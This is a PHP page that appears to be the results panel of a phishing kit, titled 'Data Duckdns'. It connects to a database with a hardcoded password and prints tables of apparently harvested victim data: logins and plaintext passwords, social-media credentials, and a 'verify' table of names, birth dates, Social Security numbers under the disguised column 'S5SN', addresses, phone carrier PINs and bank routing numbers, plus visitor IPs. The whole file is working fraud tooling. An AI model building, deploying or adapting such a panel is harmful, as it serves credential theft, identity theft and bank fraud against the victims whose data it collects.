<!DOCTYPE html>
<html lang="en">

<head>
    <title>Data Duckdns</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet"
        href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha.5/css/bootstrap.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha.5/js/bootstrap.min.js"></script>
</head>

<body>

    <?php
	include'Protection.php';
  
  //Change the password to match your configuration
  $link = mysqli_connect("localhost", "chasd_user", "immAN@@4A", "chasd_data");

  // Check connection
  if($link === false){
      die("ERROR: Could not connect. " . mysqli_connect_error());
  }
  echo "<br>";
  
  
  $sql = "SELECT * FROM users";
  $result = $link->query($sql);
		
	echo "<div class='container'>";
		echo "<div class='row-fluid'>";
		    echo "<div><h3>Data Users</h3></div>";
			echo "<div class='col-xs-12'>";
			echo "<div class='table-responsive'>";
			
				echo "<table class='table table-hover table-inverse'>";
				
				echo "<tr>";
				echo "<th>ID</th>";
				echo "<th>TOKEN</th>";
				echo "<th>USERNAME</th>";
				echo "<th>EMAIL</th>";
				echo "<th>PASSWORD</th>";
				echo "</tr>";
		  
				if ($result->num_rows > 0) {
					// output data of each row
					while($row = $result->fetch_assoc()) {
							
						echo "<tr>";
						echo "<td>" . $row["id"] . "</td>";
						echo "<td>" . $row["token"] . "</td>";
						echo "<td>" . $row["username"] . "</td>";
						echo "<td>" . $row["email"] . "</td>";
						echo "<td>" . $row["password"] . "</td>";
						echo "</tr>";			
					}
				} else {
					echo "0 results";
				}
				
				echo "</table>";
				

			echo "</div>";
			echo "</div>";

		echo "</div>";
		
		
// 		Sosmed
        $sql = "SELECT * FROM sosmed";
        $result2 = $link->query($sql);
		echo "<div class='row-fluid'>";
		    echo "<div><h3>Data Sosmed</h3></div>";
			echo "<div class='col-xs-12'>";
			echo "<div class='table-responsive'>";
			
				echo "<table class='table table-hover table-inverse'>";
				
				echo "<tr>";
				echo "<th>ID</th>";
				echo "<th>TOKEN</th>";
				echo "<th>EMAIL</th>";
				echo "<th>PASSWORD</th>";
				echo "</tr>";
		  
				if ($result2->num_rows > 0) {
					// output data of each row
					while($row = $result2->fetch_assoc()) {
							
						echo "<tr>";
						echo "<td>" . $row["id"] . "</td>";
						echo "<td>" . $row["token"] . "</td>";
						echo "<td>" . $row["email"] . "</td>";
						echo "<td>" . $row["password"] . "</td>";
						echo "</tr>";			
					}
				} else {
					echo "0 results";
				}
				
				echo "</table>";
				

			echo "</div>";
			echo "</div>";

		echo "</div>";
		
// 	End Sosmed


// 		Verify
        $sql = "SELECT * FROM `verify`";
        $result2 = $link->query($sql);
		echo "<div class='row-fluid'";
		    echo "<div><h3>Data Verify</h3></div>";
			echo "<div class='col-xs-12'>";
			echo "<div class='table-responsive'>";
			
				echo "<table class='table table-hover table-inverse'>";
				
				echo "<tr>";
				echo "<th>ID</th>";
				echo "<th>TOKEN</th>";
				echo "<th>FIRSTNAME</th>";
				echo "<th>LASTNAME</th>";
				echo "<th>DOB</th>";
				echo "<th>S5SN</th>";
				echo "<th>ISSUEST</th>";
				echo "<th>STREETADD</th>";
				echo "<th>ADDRESS</th>";
				echo "<th>ZIPCODE</th>";
				echo "<th>CITY</th>";
				echo "<th>STATE</th>";
				echo "<th>PHONE NUMBER</th>";
				echo "<th>CARRIER PIN</th>";
				echo "<th>ROUTING NUMBER</th>";
				echo "<th>BRANCH NUMBER</th>";
				echo "</tr>";
		  
				if ($result2->num_rows > 0) {
					// output data of each row
					while($row = $result2->fetch_assoc()) {
							
						echo "<tr>";
						echo "<td>" . $row["id"] . "</td>";
						echo "<td>" . $row["token"] . "</td>";
						echo "<td>" . $row["firstname"] . "</td>";
						echo "<td>" . $row["lastname"] . "</td>";
						echo "<td>" . $row["dob"] . "</td>";
						echo "<td>" . $row["S5SN"] . "</td>";
						echo "<td>" . $row["issuest"] . "</td>";
						echo "<td>" . $row["Streetadd"] . "</td>";
						echo "<td>" . $row["address2"] . "</td>";
						echo "<td>" . $row["zipcode"] . "</td>";
						echo "<td>" . $row["city"] . "</td>";
						echo "<td>" . $row["state"] . "</td>";
						echo "<td>" . $row["phoneNumber"] . "</td>";
						echo "<td>" . $row["carrierpin"] . "</td>";
						echo "<td>" . $row["routingNumber"] . "</td>";
						echo "<td>" . $row["branchNumber"] . "</td>";
						echo "</tr>";			
					}
				} else {
					echo "0 results";
				}
				
				echo "</table>";
				

			echo "</div>";
			echo "</div>";

		echo "</div>";
		
// 	End Verify

//  VisitorIp
		$sql = "SELECT * FROM `VisitorIP`";
		$result2 = $link->query($sql);
		echo "<div class='row-fluid'";
			echo "<div><h3>Visitors</h3></div>";
			echo "<div class='col-xs-12'>";
			echo "<div class='table-responsive'>";
			
				echo "<table class='table table-hover table-inverse'>";
				
				echo "<tr>";
				echo "<th>IP</th>";
				echo "<th>TYPE</th>";
				echo "</tr>";
		
				if ($result2->num_rows > 0) {
					// output data of each row
					while($row = $result2->fetch_assoc()) {
							
						echo "<tr>";
						echo "<td>" . $row["ip"] . "</td>";
						echo "<td>" . $row["type"] . "</td>";
						echo "</tr>";			
					}
				} else {
					echo "0 results";
				}
				
				echo "</table>";
				

			echo "</div>";
			echo "</div>";

		echo "</div>";
//	End VisitorIp
		
	echo "</div>";

  // Close connection
  mysqli_close($link);
  ?>


</body>

</html>